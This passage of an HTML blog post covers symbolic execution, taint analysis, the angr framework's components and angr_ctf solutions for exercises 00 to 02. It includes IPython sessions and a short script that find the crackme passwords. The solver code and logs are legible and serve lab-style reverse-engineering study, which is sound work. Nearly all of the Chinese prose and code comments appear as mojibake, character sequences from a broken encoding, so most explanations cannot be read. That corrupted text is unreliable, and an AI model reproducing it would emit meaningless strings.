å‡ºä¸€æ¡æ–°çš„å¯è¡Œçš„è·¯å¾„çº¦æŸï¼Œå¹¶ç”¨çº¦æŸæ±‚è§£å™¨æ±‚è§£å‡ºä¸€ä¸ªå¯è¡Œçš„æ–°çš„å…·ä½“è¾“å…¥ï¼Œæ¥ç€ç¬¦å·æ‰§è¡Œå¼•æ“å¯¹æ–°è¾“å…¥å€¼è¿›è¡Œä¸€è½®æ–°çš„åˆ†æã€‚é€šè¿‡ä½¿ç”¨è¿™ç§è¾“å…¥è¿­ä»£äº§ç”Ÿå˜ç§è¾“å…¥çš„æ–¹æ³•ï¼Œç†è®ºä¸Šæ‰€æœ‰å¯è¡Œçš„è·¯å¾„éƒ½å¯ä»¥è¢«è®¡ç®—å¹¶åˆ†æä¸€éã€‚<br>åŠ¨æ€ç¬¦å·æ‰§è¡Œç›¸å¯¹äºé™æ€ç¬¦å·æ‰§è¡Œçš„ä¼˜ç‚¹æ˜¯æ¯æ¬¡éƒ½æ˜¯å…·ä½“è¾“å…¥çš„æ‰§è¡Œï¼Œåœ¨æ¨¡æ‹Ÿæ‰§è¡Œè¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œ<strong>ç¬¦å·åŒ–çš„æ¨¡æ‹Ÿæ‰§è¡Œæ¯”å…·ä½“åŒ–çš„æ¨¡æ‹Ÿæ‰§è¡Œçš„å¼€é”€å¤§å¾ˆå¤š</strong>ï¼›å¹¶ä¸”æ¨¡æ‹Ÿæ‰§è¡Œè¿‡ç¨‹ä¸­æ‰€æœ‰çš„å˜é‡éƒ½ä¸ºå…·ä½“å€¼ï¼Œè€Œä¸å¿…ä½¿ç”¨å¤æ‚çš„æ•°æ®ç»“æ„æ¥è¡¨è¾¾ç¬¦å·å€¼ï¼Œä½¿å¾—æ¨¡æ‹Ÿæ‰§è¡Œçš„èŠ±é”€è¿›ä¸€æ­¥å‡å°‘ã€‚ä½†æ˜¯åŠ¨æ€ç¬¦å·æ‰§è¡Œçš„ç»“æœæ˜¯å¯¹ç¨‹åºçš„æ‰€æœ‰è·¯å¾„çš„ä¸€ä¸ªä¸‹é€¼è¿‘ï¼Œå³å…¶æœ€å<strong>äº§ç”Ÿè·¯å¾„çš„é›†åˆåº”è¯¥æ¯”æ‰€æœ‰è·¯å¾„é›†åˆå°</strong>ï¼Œä½†è¿™ç§æƒ…å†µåœ¨è½¯ä»¶æµ‹è¯•ä¸­æ˜¯å…è®¸çš„ã€‚</p><h2 id="æ­£å‘çš„ç¬¦å·æ‰§è¡Œ"><a href="#æ­£å‘çš„ç¬¦å·æ‰§è¡Œ" class="headerlink" title="æ­£å‘çš„ç¬¦å·æ‰§è¡Œ"></a>æ­£å‘çš„ç¬¦å·æ‰§è¡Œ</h2><p>æ­£å‘çš„ç¬¦å·æ‰§è¡Œç”¨äºå…¨é¢åœ°å¯¹ç¨‹åºä»£ç è¿›è¡Œåˆ†æï¼Œå¯åˆ†ä¸ºè¿‡ç¨‹å†…åˆ†æå’Œè¿‡ç¨‹é—´åˆ†æã€‚</p><ul><li><p>è¿‡ç¨‹å†…åˆ†æï¼šåªå¯¹å•ä¸ªå‡½æ•°çš„ä»£ç è¿›è¡Œåˆ†æ</p></li><li><p>è¿‡ç¨‹é—´åˆ†æï¼ˆæˆ–å…¨å±€åˆ†æï¼‰ï¼šå¯¹æ•´ä¸ªè½¯ä»¶ä»£ç è¿›è¡Œä¸Šä¸‹æ–‡æ•æ„Ÿçš„åˆ†æï¼Œåœ¨å½“å‰å‡½æ•°å…¥å£ç‚¹è¦è€ƒè™‘å½“å‰å‡½æ•°çš„è°ƒç”¨ä¿¡æ¯å’Œç¯å¢ƒä¿¡æ¯ç­‰</p></li></ul><h2 id="é€†å‘çš„ç¬¦å·æ‰§è¡Œ"><a href="#é€†å‘çš„ç¬¦å·æ‰§è¡Œ" class="headerlink" title="é€†å‘çš„ç¬¦å·æ‰§è¡Œ"></a>é€†å‘çš„ç¬¦å·æ‰§è¡Œ</h2><p>é€†å‘çš„ç¬¦å·æ‰§è¡Œç”¨äºå¯¹å¯èƒ½å­˜åœ¨æ¼æ´çš„éƒ¨åˆ†ä»£ç è¿›è¡Œæœ‰é’ˆå¯¹æ€§çš„åˆ†æã€‚é€šè¿‡åˆ†æè¿™äº›ç¨‹åºè¯­å¥ï¼Œå¯ä»¥å¾—åˆ°å˜é‡å–å€¼æ»¡è¶³æ€æ ·çš„çº¦æŸè¡¨ç¤ºç¨‹åºå­˜åœ¨æ¼æ´ï¼Œå°†è¿™æ ·çš„çº¦æŸè®°å½•ä¸‹æ¥ï¼Œåœ¨ä¹‹åçš„åˆ†æä¸­ï¼Œé€šè¿‡é€†å‘åˆ†æåˆ¤æ–­ç¨‹åºå­˜åœ¨æ¼æ´çš„çº¦æŸæ˜¯å¦æ˜¯å¯ä»¥æ»¡è¶³çš„ã€‚é€šè¿‡ä¸æ–­åœ°è®°å½•å¹¶åˆ†æè·¯å¾„æ¡ä»¶ï¼Œæ£€æŸ¥ç¨‹åºæ˜¯å¦å¯èƒ½å­˜åœ¨å¸¦æœ‰ç¨‹åºæ¼æ´çš„è·¯å¾„ã€‚</p><h2 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h2><p>è·¯å¾„çŠ¶æ€ç©ºé—´çˆ†ç‚¸é—®é¢˜ï¼šç”±äºæ¯ä¸€ä¸ªæ¡ä»¶åˆ†æ”¯è¯­å¥éƒ½å¯èƒ½ä¼šä½¿å½“å‰è·¯å¾„å†åˆ†å‡ºä¸€æ¡æ–°çš„è·¯å¾„ï¼Œç‰¹åˆ«æ˜¯é‡åˆ°å¾ªç¯åˆ†æ”¯æ—¶ï¼Œæ¯å¢åŠ ä¸€æ¬¡å¾ªç¯éƒ½å°†å¢åŠ ä¸€æ¡æ–°è·¯å¾„ï¼Œå› æ­¤è¿™ç§å¢é•¿æ˜¯æŒ‡æ•°çº§çš„ã€‚</p><ul><li>è§£å†³ï¼šæ¯”å¦‚è§„å®šæ¯ä¸ªè¿‡ç¨‹å†…çš„åˆ†æè·¯å¾„çš„æ•°ç›®ä¸Šé™ï¼Œæˆ–è€…è®¾ç½®æ—¶é—´ä¸Šé™å’Œå†…å­˜ä¸Šé™ç­‰æ¥è¿›è¡Œç¼“è§£ã€‚</li></ul><h1 id="æ±¡ç‚¹åˆ†æ"><a href="#æ±¡ç‚¹åˆ†æ" class="headerlink" title="æ±¡ç‚¹åˆ†æ"></a>æ±¡ç‚¹åˆ†æ</h1><p>æ±¡ç‚¹åˆ†æå¯ä»¥æŠ½è±¡æˆä¸€ä¸ªä¸‰å…ƒç»„<code>&lt;sources,sinks,sanitizers&gt;</code>çš„å½¢å¼</p><p>source ï¼š<strong>æ±¡ç‚¹æº</strong>ï¼Œä»£è¡¨ç›´æ¥å¼•å…¥ä¸å—ä¿¡ä»»çš„æ•°æ®æˆ–è€…æœºå¯†æ•°æ®åˆ°ç³»ç»Ÿä¸­ï¼›</p><p>sinkï¼š<strong>æ±¡ç‚¹æ±‡èšç‚¹</strong>ï¼Œä»£è¡¨ç›´æ¥äº§ç”Ÿå®‰å…¨æ•æ„Ÿæ“ä½œ(è¿åæ•°æ®å®Œæ•´æ€§)æˆ–è€…æ³„éœ²éšç§æ•°æ®åˆ°å¤–ç•Œ(è¿åæ•°æ®ä¿å¯†æ€§)ï¼›</p><p>sanitizerï¼š<strong>æ— å®³å¤„ç†</strong>ï¼Œä»£è¡¨é€šè¿‡æ•°æ®åŠ å¯†æˆ–è€…ç§»é™¤å±å®³æ“ä½œç­‰æ‰‹æ®µä½¿æ•°æ®ä¼ æ’­ä¸å†å¯¹è½¯ä»¶ç³»ç»Ÿçš„ä¿¡æ¯å®‰å…¨äº§ç”Ÿå±å®³ã€‚</p><p><strong>æ±¡ç‚¹åˆ†æ</strong>æ˜¯ä¸€ç§è·Ÿè¸ªå¹¶åˆ†ææ±¡ç‚¹ä¿¡æ¯åœ¨ç¨‹åºä¸­æµåŠ¨çš„æŠ€æœ¯ã€‚åœ¨æ¼æ´åˆ†æä¸­ï¼Œä½¿ç”¨æ±¡ç‚¹åˆ†ææŠ€æœ¯å°†æ‰€æ„Ÿå…´è¶£çš„æ•°æ®ï¼ˆé€šå¸¸æ¥è‡ªç¨‹åºçš„å¤–éƒ¨è¾“å…¥ï¼‰æ ‡è®°ä¸ºæ±¡ç‚¹æ•°æ®ï¼Œç„¶åé€šè¿‡è·Ÿè¸ªå’Œæ±¡ç‚¹æ•°æ®ç›¸å…³çš„ä¿¡æ¯çš„æµå‘ï¼Œå¯ä»¥çŸ¥é“å®ƒä»¬æ˜¯å¦ä¼šå½±å“æŸäº›å…³é”®çš„ç¨‹åºæ“ä½œï¼Œè¿›è€ŒæŒ–æ˜ç¨‹åºæ¼æ´ã€‚å³å°†ç¨‹åºæ˜¯å¦å­˜åœ¨æŸç§æ¼æ´çš„é—®é¢˜è½¬åŒ–ä¸º<strong>æ±¡ç‚¹ä¿¡æ¯æ˜¯å¦ä¼šè¢« Sink ç‚¹ä¸Šçš„æ“ä½œæ‰€ä½¿ç”¨</strong>çš„é—®é¢˜ã€‚</p><ul><li><strong>æ˜¾å¼ä¿¡æ¯æµ</strong>ï¼šé€šè¿‡æ•°æ®ä¾èµ–ä¼ æ’­çš„ä¿¡æ¯æµ</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line">scanf(&quot;%d&quot;, &amp;x);    // Source ç‚¹ï¼Œè¾“å…¥æ•°æ®è¢«æ ‡è®°ä¸ºæ±¡ç‚¹ä¿¡æ¯ï¼Œå¹¶ä¸”è®¤ä¸ºå˜é‡ x æ˜¯æ±¡æŸ“çš„</span><br><span class="line">[...]</span><br><span class="line">y = x + k;          // å¦‚æœäºŒå…ƒæ“ä½œçš„æ“ä½œæ•°æ˜¯æ±¡æŸ“çš„ï¼Œé‚£ä¹ˆæ“ä½œç»“æœä¹Ÿæ˜¯æ±¡æŸ“çš„ï¼Œæ‰€ä»¥å˜é‡ y ä¹Ÿæ˜¯æ±¡æŸ“çš„</span><br><span class="line">[...]</span><br><span class="line">x = 0;              // å¦‚æœä¸€ä¸ªè¢«æ±¡æŸ“çš„å˜é‡è¢«èµ‹å€¼ä¸ºä¸€ä¸ªå¸¸æ•°ï¼Œé‚£ä¹ˆè®¤ä¸ºå®ƒæ˜¯æœªæ±¡æŸ“çš„ï¼Œæ‰€ä»¥ x è½¬å˜æˆæœªæ±¡æŸ“çš„</span><br><span class="line">[...]</span><br><span class="line">while (i &lt; y)       // Sink ç‚¹ï¼Œå¦‚æœè§„å®šå¾ªç¯çš„æ¬¡æ•°ä¸èƒ½å—ç¨‹åºè¾“å…¥çš„å½±å“ï¼Œé‚£ä¹ˆéœ€è¦æ£€æŸ¥ y æ˜¯å¦è¢«æ±¡æŸ“</span><br></pre></td></tr></table></figure><ul><li><strong>éšå¼ä¿¡æ¯æµ</strong>ï¼šé€šè¿‡æ§åˆ¶ä¾èµ–ä¼ æ’­çš„ä¿¡æ¯æµ</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (x &gt; 0)// å˜é‡ y çš„å–å€¼ä¾èµ–äºå˜é‡ x çš„å–å€¼ï¼Œå¦‚æœå˜é‡ x æ˜¯æ±¡æŸ“çš„ï¼Œé‚£ä¹ˆå˜é‡ y ä¹Ÿåº”è¯¥æ˜¯æ±¡æŸ“çš„ã€‚</span><br><span class="line">    y = 1;</span><br><span class="line">else</span><br><span class="line">    y = 0;</span><br></pre></td></tr></table></figure><h2 id="é™æ€æ±¡ç‚¹åˆ†æ"><a href="#é™æ€æ±¡ç‚¹åˆ†æ" class="headerlink" title="é™æ€æ±¡ç‚¹åˆ†æ"></a>é™æ€æ±¡ç‚¹åˆ†æ</h2><p>é™æ€æ±¡ç‚¹åˆ†æç³»ç»Ÿé¦–å…ˆå¯¹ç¨‹åºä»£ç è¿›è¡Œè§£æï¼Œè·å¾—ç¨‹åºä»£ç çš„ä¸­é—´è¡¨ç¤ºï¼Œç„¶ååœ¨ä¸­é—´è¡¨ç¤ºçš„åŸºç¡€ä¸Šå¯¹ç¨‹åºä»£ç è¿›è¡Œæ§åˆ¶æµåˆ†æç­‰è¾…åŠ©åˆ†æï¼Œä»¥è·å¾—éœ€è¦çš„æ§åˆ¶æµå›¾ã€è°ƒç”¨å›¾ç­‰ã€‚åœ¨è¾…åŠ©åˆ†æçš„è¿‡ç¨‹ä¸­ï¼Œç³»ç»Ÿå¯ä»¥åˆ©ç”¨æ±¡ç‚¹åˆ†æè§„åˆ™åœ¨ä¸­é—´è¡¨ç¤ºä¸Šè¯†åˆ«ç¨‹åºä¸­çš„ Source ç‚¹å’Œ Sink ç‚¹ã€‚æœ€åæ£€æµ‹ç³»ç»Ÿæ ¹æ®æ±¡ç‚¹åˆ†æè§„åˆ™ï¼Œåˆ©ç”¨é™æ€æ±¡ç‚¹åˆ†ææ£€æŸ¥ç¨‹åºæ˜¯å¦å­˜åœ¨æ±¡ç‚¹ç±»å‹çš„æ¼æ´ã€‚</p><p>åŸºäºæ•°æ®æµçš„æ±¡ç‚¹åˆ†æã€‚åœ¨<strong>ä¸è€ƒè™‘éšå¼ä¿¡æ¯æµ</strong>çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥å°†æ±¡ç‚¹åˆ†æçœ‹åšé’ˆå¯¹æ±¡ç‚¹æ•°æ®çš„æ•°æ®æµåˆ†æã€‚æ ¹æ®æ±¡ç‚¹ä¼ æ’­è§„åˆ™<strong>è·Ÿè¸ªæ±¡ç‚¹ä¿¡æ¯</strong>æˆ–è€…<strong>æ ‡è®°è·¯å¾„ä¸Šçš„å˜é‡æ±¡æŸ“æƒ…å†µ</strong>ï¼Œè¿›è€Œæ£€æŸ¥æ±¡ç‚¹ä¿¡æ¯æ˜¯å¦å½±å“æ•æ„Ÿæ“ä½œã€‚</p><p>åŸºäºä¾èµ–å…³ç³»çš„æ±¡ç‚¹åˆ†æã€‚è€ƒè™‘éšå¼ä¿¡æ¯æµï¼Œåœ¨åˆ†æè¿‡ç¨‹ä¸­ï¼Œæ ¹æ®ç¨‹åºä¸­çš„è¯­å¥æˆ–è€…æŒ‡ä»¤ä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼Œ<strong>æ£€æŸ¥ Sink ç‚¹å¤„æ•æ„Ÿæ“ä½œæ˜¯å¦ä¾èµ–äº Source ç‚¹å¤„æ¥æ”¶æ±¡ç‚¹ä¿¡æ¯çš„æ“ä½œ</strong>ã€‚</p><h2 id="åŠ¨æ€æ±¡ç‚¹åˆ†æ"><a href="#åŠ¨æ€æ±¡ç‚¹åˆ†æ" class="headerlink" title="åŠ¨æ€æ±¡ç‚¹åˆ†æ"></a>åŠ¨æ€æ±¡ç‚¹åˆ†æ</h2><p>åŠ¨æ€æ±¡ç‚¹åˆ†ææ˜¯åœ¨<strong>ç¨‹åºè¿è¡Œ</strong>çš„åŸºç¡€ä¸Šï¼Œå¯¹æ•°æ®æµæˆ–æ§åˆ¶æµè¿›è¡Œç›‘æ§ï¼Œä»è€Œå®ç°å¯¹æ•°æ®åœ¨å†…å­˜ä¸­çš„æ˜¾å¼ä¼ æ’­ã€æ•°æ®è¯¯ç”¨ç­‰è¿›è¡Œè·Ÿè¸ªå’Œæ£€æµ‹ã€‚åŠ¨æ€æ±¡ç‚¹åˆ†æä¸é™æ€æ±¡ç‚¹åˆ†æçš„å”¯ä¸€åŒºåˆ«åœ¨äº<strong>é™æ€æ±¡ç‚¹åˆ†ææŠ€æœ¯åœ¨æ£€æµ‹æ—¶å¹¶ä¸çœŸæ­£è¿è¡Œç¨‹åº</strong>ï¼Œè€Œæ˜¯é€šè¿‡æ¨¡æ‹Ÿç¨‹åºçš„æ‰§è¡Œè¿‡ç¨‹æ¥ä¼ æ’­æ±¡ç‚¹æ ‡è®°ï¼Œè€ŒåŠ¨æ€æ±¡ç‚¹åˆ†ææŠ€æœ¯éœ€è¦è¿è¡Œç¨‹åºï¼ŒåŒæ—¶å®æ—¶ä¼ æ’­å¹¶æ£€æµ‹æ±¡ç‚¹æ ‡è®°ã€‚è¯†åˆ«å‡ºæ±¡ç‚¹æ•°æ®åï¼Œéœ€è¦å¯¹æ±¡ç‚¹è¿›è¡Œæ ‡è®°ã€‚<strong>æ±¡ç‚¹ç”Ÿå‘½å‘¨æœŸ</strong>æ˜¯æŒ‡åœ¨è¯¥ç”Ÿå‘½å‘¨æœŸçš„æ—¶é—´èŒƒå›´å†…ï¼Œæ±¡ç‚¹è¢«å®šä¹‰ä¸ºæœ‰æ•ˆã€‚æ±¡ç‚¹ç”Ÿå‘½å‘¨æœŸå¼€å§‹äºæ±¡ç‚¹åˆ›å»ºæ—¶åˆ»ï¼Œç”Ÿæˆæ±¡ç‚¹æ ‡è®°ï¼Œç»“æŸäºæ±¡ç‚¹åˆ é™¤æ—¶åˆ»ï¼Œæ¸…é™¤æ±¡ç‚¹æ ‡è®°ã€‚</p><h1 id="angr"><a href="#angr" class="headerlink" title="angr"></a>angr</h1><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211015095508733.png" alt="image-20211015095508733"></p><ul><li><p>CLEï¼ˆCLE Load Everythingï¼‰ï¼šå¯æ‰§è¡Œæ–‡ä»¶å’Œåº“çš„åŠ è½½å™¨</p><p>è´Ÿè´£è£…è½½äºŒè¿›åˆ¶å¯¹è±¡ä»¥åŠå®ƒæ‰€ä¾èµ–çš„åº“ï¼Œå°†è‡ªèº«æ— æ³•æ‰§è¡Œçš„æ“ä½œè½¬ç§»ç»™angrçš„å…¶å®ƒç»„ä»¶ï¼Œæœ€åç”Ÿæˆåœ°å€ç©ºé—´ï¼Œè¡¨ç¤ºè¯¥ç¨‹åºå·²åŠ è½½å¹¶å¯ä»¥å‡†å¤‡è¿è¡Œã€‚</p></li><li><p>archinfoï¼šæè¿°å„ç§æ¶æ„çš„åº“</p></li><li><p>PyVEXï¼šå…³äºäºŒè¿›åˆ¶ä»£ç è½¬æ¢VEXçš„pythonåŒ…è£…å™¨</p><p>angréœ€è¦å¤„ç†ä¸åŒçš„æ¶æ„ï¼Œæ‰€ä»¥å®ƒé€‰æ‹©ä¸€ç§ä¸­é—´è¯­è¨€æ¥è¿›è¡Œå®ƒçš„åˆ†æï¼Œangrä½¿ç”¨Valgrindçš„ä¸­é—´è¯­è¨€â€”â€”VEXæ¥å®Œæˆè¿™æ–¹é¢çš„å†…å®¹ã€‚VEXä¸­é—´è¯­è¨€æŠ½è±¡äº†å‡ ç§ä¸åŒæ¶æ„é—´çš„åŒºåˆ«ï¼Œå…è®¸åœ¨ä»–ä»¬ä¹‹ä¸Šè¿›è¡Œç»Ÿä¸€çš„åˆ†æã€‚</p></li><li><p>SimuVEXï¼šä¸­é—´è¯­è¨€VEXæ‰§è¡Œçš„æ¨¡æ‹Ÿå™¨</p><p>å®ƒå…è®¸ä½ æ§åˆ¶ç¬¦å·æ‰§è¡Œ</p></li><li><p>Claripyï¼šæŠ½è±¡çš„çº¦æŸæ±‚è§£åŒ…è£…å™¨</p><p>ä¸“æ³¨äºå°†å˜é‡ç¬¦å·åŒ–ï¼Œç”Ÿæˆçº¦æŸå¼å¹¶æ±‚è§£çº¦æŸå¼ï¼Œç¬¦å·æ‰§è¡Œçš„æ ¸å¿ƒæ‰€åœ¨ã€‚</p></li><li><p>Angrï¼šç¨‹åºåˆ†æå¥—ä»¶</p></li><li><p>ä»¥ä¸Šï¼šä¸Šå±‚å°è£…å¥½çš„æ¥å£</p></li></ul><h2 id="angr-ctf"><a href="#angr-ctf" class="headerlink" title="angr_ctf"></a>angr_ctf</h2><h3 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h3><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211015142359703.png" alt="image-20211015142359703"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">In [1]: import angr</span><br><span class="line"></span><br><span class="line">In [2]: p = angr.Project(&quot;./00_angr_find&quot;)# æ‰“å¼€è¦æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">In [3]: init_state = p.factory.entry_state()# åˆ›å»ºç©ºç™½çš„æ‰§è¡Œä¸Šä¸‹æ–‡ç¯å¢ƒ</span><br><span class="line"></span><br><span class="line">In [4]: smg = p.factory.simulation_manager(init_state)# åˆ›å»ºæ¨¡æ‹Ÿå™¨</span><br><span class="line"></span><br><span class="line">In [5]: smg.explore(find=0x8048675)# æ¢ç´¢åˆ°ç›®æ ‡åœ°å€</span><br><span class="line">WARNING | 2021-10-15 05:06:35,829 | angr.storage.memory_mixins.default_filler_mixin | The program is accessing memory or registers with an unspecified value. This could indicate unwanted behavior.</span><br><span class="line">WARNING | 2021-10-15 05:06:35,830 | angr.storage.memory_mixins.default_filler_mixin | angr will cope with this by generating an unconstrained symbolic variable and continuing. You can resolve this by:</span><br><span class="line">WARNING | 2021-10-15 05:06:35,830 | angr.storage.memory_mixins.default_filler_mixin | 1) setting a value to the initial state</span><br><span class="line">WARNING | 2021-10-15 05:06:35,830 | angr.storage.memory_mixins.default_filler_mixin | 2) adding the state option ZERO_FILL_UNCONSTRAINED_&#123;MEMORY,REGISTERS&#125;, to make unknown regions hold null</span><br><span class="line">WARNING | 2021-10-15 05:06:35,830 | angr.storage.memory_mixins.default_filler_mixin | 3) adding the state option SYMBOL_FILL_UNCONSTRAINED_&#123;MEMORY,REGISTERS&#125;, to suppress these messages.</span><br><span class="line">WARNING | 2021-10-15 05:06:35,830 | angr.storage.memory_mixins.default_filler_mixin | Filling register edi with 4 unconstrained bytes referenced from 0x80486b1 (__libc_csu_init+0x1 in 00_angr_find (0x80486b1))</span><br><span class="line">WARNING | 2021-10-15 05:06:35,832 | angr.storage.memory_mixins.default_filler_mixin | Filling register ebx with 4 unconstrained bytes referenced from 0x80486b3 (__libc_csu_init+0x3 in 00_angr_find (0x80486b3))</span><br><span class="line">WARNING | 2021-10-15 05:06:38,184 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7ffeff60 with 4 unconstrained bytes referenced from 0x818ac20 (strcmp+0x0 in libc.so.6 (0x8ac20))</span><br><span class="line">Out[5]: &lt;SimulationManager with 1 active, 16 deadended, 1 found&gt;# æ‰¾åˆ°ä¸€ä¸ªç»“æœ</span><br><span class="line"></span><br><span class="line">In [6]: found_state = smg.found[0]</span><br><span class="line"></span><br><span class="line">In [7]: found_state.posix.dumps(0)</span><br><span class="line">Out[7]: b&apos;JXWVXRKX&apos;</span><br></pre></td></tr></table></figure><h3 id="01-angr-avoid"><a href="#01-angr-avoid" class="headerlink" title="01_angr_avoid"></a>01_angr_avoid</h3><p><code>Options -&gt; General -&gt; Line prefixes(graph) è°ƒå‡ºGraphæ¡†åœ°å€</code></p><p>ç›®æ ‡</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211015150619082.png" alt="image-20211015150619082"></p><p>åŒæ—¶ä¸ºäº†èŠ‚çœç®—æ—¶ï¼Œæˆ‘ä»¬ä¸æƒ³åˆ°è¾¾avoid_meå¤„</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211015150557340.png" alt="image-20211015150557340"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">In [2]: import angr</span><br><span class="line"></span><br><span class="line">In [3]: p = angr.Project(&quot;./01_angr_avoid&quot;)</span><br><span class="line"></span><br><span class="line">In [4]: init_state = p.factory.entry_state()</span><br><span class="line"></span><br><span class="line">In [5]: smg = p.factory.simulation_manager(init_state)</span><br><span class="line"></span><br><span class="line">In [6]: smg.explore(find=0x080485E0, avoid=0x080485A8)# findç›®æ ‡åœ°å€ avoidæ’é™¤åœ°å€</span><br><span class="line">WARNING | 2021-10-15 07:04:50,906 | angr.storage.memory_mixins.default_filler_mixin | The program is accessing memory or registers with an unspecified value. This could indicate unwanted behavior.</span><br><span class="line">WARNING | 2021-10-15 07:04:50,906 | angr.storage.memory_mixins.default_filler_mixin | angr will cope with this by generating an unconstrained symbolic variable and continuing. You can resolve this by:</span><br><span class="line">WARNING | 2021-10-15 07:04:50,906 | angr.storage.memory_mixins.default_filler_mixin | 1) setting a value to the initial state</span><br><span class="line">WARNING | 2021-10-15 07:04:50,906 | angr.storage.memory_mixins.default_filler_mixin | 2) adding the state option ZERO_FILL_UNCONSTRAINED_&#123;MEMORY,REGISTERS&#125;, to make unknown regions hold null</span><br><span class="line">WARNING | 2021-10-15 07:04:50,906 | angr.storage.memory_mixins.default_filler_mixin | 3) adding the state option SYMBOL_FILL_UNCONSTRAINED_&#123;MEMORY,REGISTERS&#125;, to suppress these messages.</span><br><span class="line">WARNING | 2021-10-15 07:04:50,906 | angr.storage.memory_mixins.default_filler_mixin | Filling register edi with 4 unconstrained bytes referenced from 0x80d4591 (__libc_csu_init+0x1 in 01_angr_avoid (0x80d4591))</span><br><span class="line">WARNING | 2021-10-15 07:04:50,908 | angr.storage.memory_mixins.default_filler_mixin | Filling register ebx with 4 unconstrained bytes referenced from 0x80d4593 (__libc_csu_init+0x3 in 01_angr_avoid (0x80d4593))</span><br><span class="line">WARNING | 2021-10-15 07:04:55,068 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7ffeff3d with 11 unconstrained bytes referenced from 0x818b210 (strncmp+0x0 in libc.so.6 (0x8b210))</span><br><span class="line">WARNING | 2021-10-15 07:04:55,068 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7ffeff60 with 4 unconstrained bytes referenced from 0x818b210 (strncmp+0x0 in libc.so.6 (0x8b210))</span><br><span class="line">Out[6]: &lt;SimulationManager with 1 active, 16 deadended, 1 found, 8 avoid&gt;</span><br><span class="line"></span><br><span class="line">In [7]: found_state = smg.found[0]</span><br><span class="line"></span><br><span class="line">In [8]: found_state.posix.dumps(0)</span><br><span class="line">Out[8]: b&apos;HUJOZMYS&apos;</span><br></pre></td></tr></table></figure><h3 id="02-angr-find-condition"><a href="#02-angr-find-condition" class="headerlink" title="02_angr_find_condition"></a>02_angr_find_condition</h3><p>ç›®æ ‡</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211015150619082.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def main(argv):</span><br><span class="line">    p = angr.Project(&quot;./02_angr_find_condition&quot;)</span><br><span class="line">    init_state = p.factory.entry_state()</span><br><span class="line">    sim = p.factory.simgr(init_state)</span><br><span class="line">    </span><br><span class="line">    sim.explore(find=0x0804900D)</span><br><span class="line">    </span><br><span class="line">    if sim.found:</span><br><span class="line">        found_state = sim.found[0]</span><br><span class="line">        print(found_state.posix.dumps(0))</span><br><span class="line">    else:</span><br><span class="line">        raise Exception(&apos;Could not find the solution!&apos;)</span><br><span class="line">    </span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure><blockquote><p>Reference:</p><p><a href="http://www.jsjkx.com/CN/article/openArticlePDF.jsp?id=224" target="_blank" rel="noopener">ç¬¦å·æ‰§è¡Œç ”ç©¶ç»¼è¿°</a></p><p><a href="https://bbs.pediy.com/thread-264775.htm" target="_blank" rel="noopener">angrå­¦ä¹ (angr_ctf)</a></p><p><a href="https://www.bookstack.cn/" target="_blank" rel="noopener">ctf all in one 5.1&amp;5.5</a></p></blockquote>]]></content>
    
    
      
      
